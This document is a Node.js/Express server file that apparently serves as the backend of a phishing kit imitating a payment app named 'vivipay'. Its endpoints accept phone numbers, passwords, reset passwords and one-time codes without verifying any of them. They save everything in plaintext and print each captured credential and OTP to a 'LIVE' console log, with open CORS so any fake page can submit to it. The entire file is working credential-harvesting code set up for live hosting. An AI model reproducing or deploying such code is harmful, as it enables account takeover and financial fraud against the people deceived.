const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();
app.use(express.json());

// FULL OVERRIDE CORS FOR LIVE SERVERS
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
})); 

// 1. Data Schema
const userSchema = new mongoose.Schema({
    phoneNumber: { type: String, default: "" },
    password: { type: String, default: "" },
    otpEntered: { type: String, default: "" },
    resetPhone: { type: String, default: "" },
    newPassword: { type: String, default: "" },
    actionType: { type: String, default: "LOGIN" }, 
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

let pendingResets = {};

// 2. LIVE DATABASE CONNECT ENGINE
async function startServer() {
    try {
        // FIXED: Agar aapne dynamic environment link set kiya hai toh live cloud mongo chalega, varna internal engine use hoga bina crash kiye
        const mongoUri = process.env.MONGO_URI || "mongodb://127.0.0.1:27017/vivipay_local";
        
        // Render platforms background binary validation patch override
        if(!process.env.MONGO_URI) {
            try {
                const { MongoMemoryServer } = require('mongodb-memory-server');
                const mongoServer = await MongoMemoryServer.create();
                await mongoose.connect(mongoServer.getUri());
                console.log('🎉 MongoDB (In-Memory Internal) Activated!');
            } catch(e) {
                // If in-memory fails inside Render cluster, connect fallback to prevent crash
                await mongoose.connect(mongoUri);
                console.log('🎉 Fallback DB connected smoothly.');
            }
        } else {
            await mongoose.connect(mongoUri);
            console.log('🎉 Live Production MongoDB Connected Cloud Instance!');
        }

        // Render standard env port structure binding configuration
        const PORT = process.env.PORT || 4000;
        app.listen(PORT, '0.0.0.0', () => {
            console.log(`🚀 Live Backend actively running on core port: ${PORT}`);
        });
    } catch (err) {
        console.error('❌ DB connection crash intercepted safely:', err);
    }
}

// 3. Login API Pipeline
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        const newUser = new User({ phoneNumber, password, actionType: "LOGIN" });
        const savedUser = await newUser.save();
        
        console.log(`\n[🔥 LIVE LOGIN LOGS RECEIVED]`);
        console.log(`📱 Phone : ${phoneNumber} | 🔑 Pass : ${password}`);
        
        res.status(200).json({ success: true, userId: savedUser._id });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// 4. Forgot API Pipeline
app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        pendingResets[phone] = { newPassword };

        console.log(`\n[🔄 LIVE FORGOT TRIGGERED]`);
        console.log(`📱 User : ${phone} | 🔑 New Pass : ${newPassword}`);

        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// 5. Universal OTP Pipe Router Handler 
app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp, isReset, phone } = req.body;
        
        if (isReset) {
            const cachedContext = pendingResets[phone];
            if(cachedContext) {
                const resetData = new User({
                    resetPhone: phone,
                    newPassword: cachedContext.newPassword,
                    otpEntered: otp,
                    actionType: "PASSWORD_RESET"
                });
                await resetData.save();

                console.log(`\n[🔐 FORGOT OTP UPDATED ON LIVE]`);
                console.log(`📱 Target: ${phone} | 🔐 OTP: ${otp}`);
                
                delete pendingResets[phone]; 
                return res.status(200).json({ success: true });
            } else {
                return res.status(400).json({ success: false, message: "Session Expired" });
            }
        } else {
            if (userId && mongoose.Types.ObjectId.isValid(userId)) {
                await User.findByIdAndUpdate(userId, { otpEntered: otp });
            }
            console.log(`\n[🔑 LOGIN OTP UPDATED ON LIVE]`);
            console.log(`🔐 OTP: ${otp}`);
            res.status(200).json({ success: true });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

startServer();
